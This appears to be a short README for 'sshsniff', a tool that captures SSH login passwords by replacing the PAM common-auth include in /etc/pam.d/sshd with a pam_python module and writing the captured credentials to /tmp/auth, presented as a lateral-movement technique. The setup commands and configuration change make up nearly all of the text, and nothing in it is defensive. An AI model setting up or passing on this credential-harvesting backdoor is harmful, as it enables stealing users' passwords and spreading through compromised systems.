# sshsniff
SSH password sniffing

Forked from https://craighays.com/gaining-lateral-movement-with-ssh-password-sniffing/

<apt-get install python libpam-python

Replace in /etc/pam.d/sshd

#@include common-auth

auth       requisite     pam_python.so common-auth.py

service ssh restart

Output: /tmp/auth
